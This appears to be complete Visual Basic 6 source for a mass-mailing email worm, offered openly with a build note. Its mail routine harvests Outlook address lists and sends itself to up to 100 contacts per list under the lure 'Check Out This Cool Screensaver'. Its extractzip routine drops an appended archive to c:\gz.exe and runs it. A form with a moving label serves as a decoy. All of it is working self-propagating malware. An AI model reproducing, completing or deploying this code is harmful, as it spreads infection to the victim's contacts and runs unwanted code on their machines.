Attribute VB_Name = "Module1"
Option Explicit
Sub Main()
Call extractzip
Call mail
Form1.Show
End Sub
Sub mail()
On Error Resume Next
Dim a, b, c, y, x, oo, d, e, sex, xx, yy, zz
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 100 Then oo = d.AddressEntries.Count
Next oo
c.Subject = "Check Out This Cool Screensaver"
c.Attachments.Add "c:\KellyOsbourne.com.gz"
c.Send
e = ""
Next y
b.Logoff
End If
End Sub
Sub extractzip()
On Error Resume Next
Dim vdir As String
Dim wormlen As String
Dim rarlen As String
Dim buffwormlen As String
Dim buffrarlen As String
vdir = App.Path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
Open vdir & App.EXEName & ".com" For Binary Access Read As #1
wormlen = (6656)
rarlen = (LOF(1) - 6656)
buffwormlen = Space(wormlen)
buffrarlen = Space(rarlen)
Get #1, , buffwormlen
Get #1, , buffrarlen
Close #1
Open "c:\gz.exe" For Binary Access Write As #2
Put #2, , buffrarlen
Close #2
FileCopy vdir & App.EXEName & ".com", "c:\KellyOsbourne.com"
Shell "c:\gz.exe -f c:\KellyOsbourne.com"
End Sub

-----------------

VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00400000&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   200
      Left            =   480
      Top             =   840
   End
   Begin VB.Label Label1 
      BackColor       =   &H00400000&
      Caption         =   "[b8]"
      BeginProperty Font 
         Name            =   "Chiller"
         Size            =   72
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C0C0&
      Height          =   2535
      Left            =   360
      TabIndex        =   0
      Top             =   240
      Width           =   3855
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Timer1_Timer()
Randomize
a = Int(Rnd * 15000)
b = Int(Rnd * 20000)
c = Int(Rnd * 20000)
d = Int(Rnd * 30000)
Form1.Move a, b, c, d
End Sub

-----------

download gzip and attach it to the end of compiled executable...